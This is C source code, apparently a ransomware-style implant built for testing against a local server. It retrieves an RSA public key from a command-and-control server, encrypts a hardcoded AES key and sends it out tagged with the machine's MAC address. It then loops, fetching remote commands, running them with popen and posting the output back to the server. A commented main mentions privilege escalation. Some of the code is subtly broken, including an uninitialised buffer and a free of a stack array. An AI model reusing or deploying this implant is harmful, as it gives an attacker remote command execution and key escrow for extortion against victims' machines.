#include <stdio.h> 
#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <math.h>
#include <ctype.h>
#include <curl/curl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <assert.h>

#define PUBKEYSIZE 451 //public key size
#define VARSIZE 256
#define VARSIZEPOST 512
#define BUFSIZE 5000


//gcc -g -o exec execCommands.c -lcurl -lcrypto

struct MemoryStruct {
  char * memory;
  size_t size;
};

static size_t PutInStruckCallback(void *contents, size_t size, size_t nmemb, void *MemStruct){
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)MemStruct;
 
  char *ptr = malloc( mem->size + realsize + 1 );
  if(ptr == NULL) {
    /* out of memory! */ 
    //printf("not enough memory (realloc returned NULL)\n");
    return 0;
  }
 
  mem->memory = ptr;
  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;
 
  return realsize;
}

/**
  Route: Any
  Request: GET
  Args: 
    Required:
        MemStruct: Struct that contains the data returned by the get request
        URI: This is the domain name of the CNC server witht the port must end in a / (ex: 127.0.0.1:5000/)
    Not require: (Can be given empty strings)
        path: This is the route of the request for the CNC server (ex: /Status)
        Var1: the variable that the route expects. Must start with a "?" (ex: ?Mac=DD-2E-D8-D5-69-69)
        Var2: The other variable that the route expects> Must start with a & if not left empty. (ex: &Blah=example)

  Action: This API should handle all get request for the CNC server if the variable is not required for that route it cna left empty 
**/
int CNCApiGet(struct MemoryStruct * MemStruct, char URI [], char path [], char var1 [] , char var2 []){
  CURL *curl_handle;
  CURLcode res;
  int size = strlen(URI) + strlen(path) + strlen(var1) + strlen(var2) + 1;
  char * URL = malloc(sizeof(char) *  size );
  memset(URL, '\0', size);
  /* init the curl session */ 
  curl_handle = curl_easy_init();
  URL = strncpy( URL, URI, size - 1 );
  URL = strncat( URL, path, size - strlen(URL) - 1 );
  URL = strncat( URL, var1, size - strlen(URL) - 1 );
  URL = strncat( URL, var2, size - strlen(URL) - 1 );
  //printf ("URL: %s \n", URL);

  curl_easy_setopt(curl_handle, CURLOPT_URL, URL);
 
  /* send all data to this function  */ 
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, PutInStruckCallback);
 
  /* we pass our 'chunk' struct to the callback function */ 
  curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)MemStruct);
 
  res = curl_easy_perform(curl_handle);

  free (URL);

  /* check for errors */ 
  if(res != CURLE_OK) {
    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    return -1;
  }

  /* cleanup curl stuff */ 
  curl_easy_cleanup(curl_handle);
  return MemStruct->size;

}

int CNCApiPost(struct MemoryStruct * MemStruct, char URI [], char path [], char var1 [] , char var2 []){
  CURL *curl_handle;
  CURLcode res;
  int sizeOfURL = strlen(URI) + strlen(path) + 1;
  int sizeOfVars =  strlen(var1) + strlen(var2) + 1;
  char * URL  = malloc(sizeof(char) *  sizeOfURL );
  char * vars = malloc(sizeof(char) *  sizeOfVars);

  memset(URL, '\0', sizeOfURL);
  memset(vars, '\0', sizeOfVars);



  /* init the curl session */ 
  curl_handle = curl_easy_init();
  URL =  strncpy( URL, URI,   sizeOfURL - 1 );
  URL =  strncat( URL, path,  sizeOfURL - strlen(URL) - 1 );
  vars = strncpy( vars, var1, sizeOfVars - 1  );
  vars = strncat( vars, var2, sizeOfVars -strlen(vars) - 1 );
  //printf ("URL:  %s \n", URL);
  //printf ("vars: %s \n", vars);


  curl_easy_setopt(curl_handle, CURLOPT_URL, URL);
  
  /* Now specify the POST data */ 
  curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, vars);
 
 
  /* send all data to this function  */ 
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, PutInStruckCallback);
 
  /* we pass our 'chunk' struct to the callback function */ 
  curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)MemStruct);
 
  res = curl_easy_perform(curl_handle);

  free (URL);
  free (vars);


  /* check for errors */ 
  if(res != CURLE_OK) {
    fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    return -1;
  }

  /* cleanup curl stuff */ 
  curl_easy_cleanup(curl_handle);
  return MemStruct->size;

} 

RSA * createRSA(unsigned char * key){
    RSA *rsa= NULL;
    BIO *keybio ;
    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }

    rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    if(rsa == NULL)
    {
        printf( "Failed to create RSA");
    }
 
    return rsa;
}

int public_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted){
    RSA * rsa = createRSA(key);
    int result = RSA_public_encrypt(data_len, data, encrypted,rsa, RSA_PKCS1_PADDING);
    return result;
}

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};


char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {

    *output_length = 4 * ((input_length + 2) / 3);
    //TODO I added one more to the malloc size to be able to add a null byte at the end
    char *encoded_data = malloc(*output_length+1);
    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';
    //I added this null byte at the end
    encoded_data[*output_length] = '\0';
    return encoded_data;
}


unsigned char *base64_decode(const char *data,
                             size_t input_length,
                             size_t *output_length) {

    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char *decoded_data = malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6)
        + (sextet_b << 2 * 6)
        + (sextet_c << 1 * 6)
        + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}


void build_decoding_table() {

    decoding_table = malloc(256);

    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char) encoding_table[i]] = i;
}


void base64_cleanup() {
    free(decoding_table);
}



void encryptAESKeySend(unsigned char * data, char mac []){
    //receiveKey 
    struct MemoryStruct chunk;
    size_t output_length;
 
    chunk.memory = NULL;  /* will be grown as needed by the realloc above */ 
    chunk.size = 0;
 
    curl_global_init(CURL_GLOBAL_ALL);
    char URI [] =  "127.0.0.1:5000";
    char path [] =  "/GetKey";
    char var1 [] =  "";
    char var2 [] =  "";
    
    unsigned char publicKey[PUBKEYSIZE];
    unsigned char  encryptedAES[5000]={};
    char * base64EncodeOutput;
    //printf("RUNNING THIS PROGRAM");



    int size = CNCApiGet(&chunk, URI, path, var1, var2 );
  
    //printf("%lu bytes retrieved\n", (unsigned long)chunk.size);


    //printf("Data:    %s\n", (char *) chunk.memory);
    // TODO: Make sure to check if pubkey has to be a byte sequence 
    //printf("cmd = %s \n cs = %d \n PUBSIZE = %d", chunk.memory, chunk.size, (int) PUBKEYSIZE );
    fflush(stdout);
    strncpy (publicKey, chunk.memory, PUBKEYSIZE -1 );

    // free(chunk.memory);
 
    /* we're done with libcurl, so clean it up */ 
    // curl_global_cleanup();

    RSA * rsa = createRSA(publicKey);

    int result = RSA_public_encrypt(strlen(data), data, encryptedAES, rsa, RSA_PKCS1_PADDING);

    //printf("\nEncrypted length = %d\n", result);
 

    if(result == -1){
        printf("Public Encrypt failed %s", ERR_error_string(ERR_get_error(),NULL) );
        exit(0);
    }
    //printf("\nAESKEY: %s\n", data);
    //printf("AESLENGTH: %d  %d \n", result, strlen(data));
    base64EncodeOutput = base64_encode(&encryptedAES, result, &output_length);

    //printf("\nExpect %d \n",  output_length );
    //printf("\nData:    %s\n   Length: %d\n", (char *) base64EncodeOutput, strlen(base64EncodeOutput));

    free(chunk.memory);
    chunk.memory = NULL; 
    chunk.size = 0;    /* no data at this point */

    
    char var3 [VARSIZE];
    char var4 [VARSIZEPOST];

    // curl_global_init(CURL_GLOBAL_ALL);
    // TODO: Double check the strncat size
    char path2 [] =  "/SendMacEncKey";
    strncpy( var3, "Mac=", VARSIZE - 1);
    strncat( var3, mac, VARSIZE - strlen(var3) - 1 );
    strncpy( var4, "&EncKey=", VARSIZEPOST - 1 );
    strncat( var4, base64EncodeOutput, VARSIZEPOST - strlen(var4) - 1 );
    
    free(base64EncodeOutput);
    
    CNCApiPost(&chunk, URI, path2, var3, var4 );
  
    //printf("%lu bytes retrieved\n", (unsigned long)chunk.size);
    //printf("Data:    %s\n", (char *) chunk.memory);

    free(chunk.memory);
    /* we're done with libcurl, so clean it up */ 
    curl_global_cleanup();

}

void CleanString( char * sentence ){
  int val;
  for (int i = 0; i < strlen(sentence); i++){
    val = isascii( *(sentence+i) );
    // if( !(*(sentence+i) < 127 && *(sentence+i) > 31 || *(sentence+i) == '\0')  ){
    if (val == 0 || *(sentence+i) == 212){
      //printf( "Before Remove: '%c'    ", *(sentence+i) );
      *(sentence+i) = ' ';
      //printf( "After Remove: '%c'    ", *(sentence+i) );
    }
    else{
      //printf( " '%c' ", *(sentence+i) );

    }
  }
}
  
void CommandControl( char mac [] ){
    //receiveKey 
    FILE *fp;
    struct MemoryStruct chunk;
    char output [BUFSIZE];
    long fsize = -1;
    size_t output_length;

 
    chunk.memory = NULL;  /* will be grown as needed by the realloc above */ 
    chunk.size = 0;    /* no data at this point */ 
 
    curl_global_init(CURL_GLOBAL_ALL);
    bool exit = true;
    bool shell = false;

    while(true){
      char URI  [] =  "127.0.0.1:5000";
      char path [] =  "/Status";
      char var2 [] =  "";
      
      char var1 [VARSIZE];
      memset(var1, '\0', VARSIZE);

      strncpy( var1, "?Mac=" , VARSIZE - 1 );
      strncat( var1, mac, VARSIZE - strlen(var1) - 1  );

      CNCApiGet(&chunk, URI, path, var1, var2 );

      shell = (chunk.memory[0] == '1');

      //printf("%lu bytes retrieved\n", (unsigned long)chunk.size);
      //printf("Data:    %s \n", (char *) chunk.memory);


      free(chunk.memory);
      chunk.memory = NULL;
      chunk.size = 0;



      // chunk.memory = memset(chunk.memory, '\0', chunk.size);  /* will be grown as needed by the realloc above */ 
      // chunk.memory = realloc(chunk.memory, 1);
      // chunk.size = 0;    /* no data at this point */ 


      //Insert shit
      while (shell){
        //printf("\n\n\n");
        char path2 [] =  "/GetCommand";        

        //Get Command
        CNCApiGet(&chunk, URI, path2, var1, var2 );
      
        //printf("%lu bytes retrieved\n", (unsigned long)chunk.size);
        //printf("Data: %s \n", (char *) chunk.memory);

        if (strcmp( (chunk.memory), "banana") == 0){
          free(chunk.memory);
          chunk.memory = NULL;
          chunk.size = 0;    /* no data at this point */ 
          //printf("\n BANANNANANANANANNA\n");
          shell = false;
          break;
        }

        if (strcmp( (chunk.memory), "None") != 0){

          fp = popen(chunk.memory,"r");
          if (fp == NULL){
            //printf("\n YOU FUCKING SUCK\n");
          }

          // printf("\n This is the size of output %ld\n", fsize);


          /* read output from command */
          // fscanf(fp,"%s",output );   /* or other STDIO input functions */
          // fread(output, 1, fsize, fp);
          while (fgets (output+strlen(output), BUFSIZE - strlen(output), fp ) != NULL);

          if ( !(strlen(output) > 0) ){
            //printf("\nCommand testdir\n");
            strncpy( output, "Finished command", BUFSIZE - strlen(output) - 1);
          }
          
          // CleanString(output);
          //Number of byte /3 ceiling. *4 = base64 bytes that I have
          // char * base64EncodeOutput;

          // printf("\nOutput length: %lu\n", strlen(output) );
          // printf("\nOutput string: [%s]\n", (output) );
          // base64EncodeOutput = base64_encode(&output, strlen(output)-1, &output_length);
          // printf("Encoded length: %lu\n", strlen(base64EncodeOutput) );
          // printf("Encoded:    %s\n", (char *) base64EncodeOutput);

          char path3 [] =  "/CommandReply";

          char var5 [VARSIZE];
          strncpy( var5, "Mac=", VARSIZE - 4 - 1 );
          strncat( var5, mac, VARSIZE - strlen(var5) - 1 );

          // int size3 = strlen(base64EncodeOutput) + 6 + 1 ;
          int size3 = strlen(output) + 6 + 1 ;

          char * var6 = malloc(sizeof(char) *  size3);
          var6 = strncpy( var6, "&Data=", size3 - 1 );
          // var6 = strncat( var6, base64EncodeOutput, size3 - strlen(var6) - 1 );
          var6 = strncat( var6, output, size3 - strlen(var6) - 1 );


          // free(base64EncodeOutput);
           
          memset(output, '\0', BUFSIZE);  /* will be grown as needed by the realloc above */ 
          //printf ("OUTPUT SHOULD BE NOTHING {%s}\n", output);
          chunk.memory = NULL;  
          chunk.size = 0;    /* no data at this point */ 


          CNCApiPost(&chunk, URI, path3, var5, var6 );
          free(var6);          
          fclose(fp);

        }
        memset(output, '\0', BUFSIZE);  /* will be grown as needed by the realloc above */ 
        free (chunk.memory);
        chunk.memory = NULL;  
        chunk.size = 0;    /* no data at this point */ 
        sleep(3);
      }

      sleep(10);


    }

    free(chunk.memory);
    free(output);
    /* we're done with libcurl, so clean it up */ 
    curl_global_cleanup();

}

/*
int main() 
{ 
 
    //priv esc 
    //do encryption
    unsigned char * Key = "+MbQeThWmZq3t6w9z$C&F)J@NcRfUjXn"; 
    char Mac [] = "0a:00:27:00:00:12";

    encryptAESKeySend(Key, Mac);
    CommandControl(Mac);
    //Delete key

    return 0; 
} */
